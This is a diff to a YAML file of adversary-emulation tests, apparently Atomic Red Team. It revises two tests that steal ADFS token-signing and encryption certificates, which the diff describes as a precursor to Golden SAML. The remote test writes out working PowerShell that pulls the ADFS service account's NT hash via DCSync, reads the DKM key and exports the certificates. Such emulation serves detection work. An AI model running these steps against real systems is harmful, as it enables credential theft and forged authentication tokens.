@@ -83,10 +83,11 @@ atomic_tests:
     cleanup_command: |
       rm -rf #{output_folder}
     name: sh
-- name: ADFS signing token certificate theft - Local
+- name: ADFS token signing and encryption certificates theft - Local
   auto_generated_guid: 78e95057-d429-4e66-8f82-0f060c1ac96f
   description: |
-    Retrieve ADFS signing token and encrypting token certificates. You must be signed in as Administrator on the ADFS server.
+    Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.
+    Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
   supported_platforms:
   - windows
   dependency_executor_name: powershell
@@ -101,15 +102,17 @@ atomic_tests:
     command: |
       Import-Module AADInternals -Force
       Export-AADIntADFSCertificates -verbose
+      Get-ChildItem | Where-Object {$_ -like "ADFS*"}
       Write-Host "Certificates retrieved successfully"
     cleanup_command: |
       Remove-Item -Path ".\ADFS_encryption.pfx"
       Remove-Item -Path ".\ADFS_signing.pfx"
     name: powershell
-- name: ADFS signing token certificate theft - Remote
+- name: ADFS token signing and encryption certificates theft - Remote
   auto_generated_guid: cab413d8-9e4a-4b8d-9b84-c985bd73a442
   description: |
-    Retrieve ADFS signing token and encrypting token certificates. You must be signed in as Domain Administrator on a domain join computer.
+    Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.
+    Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
   supported_platforms:
   - windows
   input_arguments:
@@ -125,20 +128,16 @@ atomic_tests:
       description: Password of replication_username
       type: String
       default: "ReallyStrongPassword"
-    dc_server_name:
-      description: Name of the DC server
-      type: String
-      default: "DC01.contoso.com"
     adfs_server_name:
-      description: Name of the ADFS server
+      description: Name of an ADFS server
       type: String
       default: "sts.contoso.com"
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      AADInternals module must be installed.
+      AADInternals and ActiveDirectory modules must be installed.
     prereq_command: |
-      if (Get-Module AADInternals) {exit 0} else {exit 1}
+      if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}
     get_prereq_command: |
       Install-Module -Name AADInternals -Force
   executor:
@@ -147,13 +146,15 @@ atomic_tests:
       Import-Module AADInternals -Force
 
       #Get Configuration
+      $dcServerName = (Get-ADDomainController).HostName
       $svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq #{adfs_service_account_name}
-      $PWord = ConvertTo-SecureString -String #{replication_password} -AsPlainText -Force
+      $PWord = ConvertTo-SecureString -String "#{replication_password}" -AsPlainText -Force
       $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord
-      $hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server #{dc_server_name} -AsHex
+      # use DCSync to fetch the ADFS service account's NT hash
+      $hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex
       $ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}
 
-      #Get Key
+      # Get certificates decryption key
       $Configuration = [xml]$ADFSConfig
       $group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group
       $container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
@@ -171,9 +172,10 @@ atomic_tests:
       $aduser=$ADSearch.FindOne() 
       $key=[byte[]]$aduser.Properties["thumbnailphoto"][0] 
 
-      #Get Certif
+      # Decrypt certificates
       Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key
 
+      Get-ChildItem | Where-Object {$_ -like "ADFS*"}
       Write-Host "Certificates retrieved successfully"
     cleanup_command: |
       Remove-Item -Path ".\ADFS_encryption.pfx"
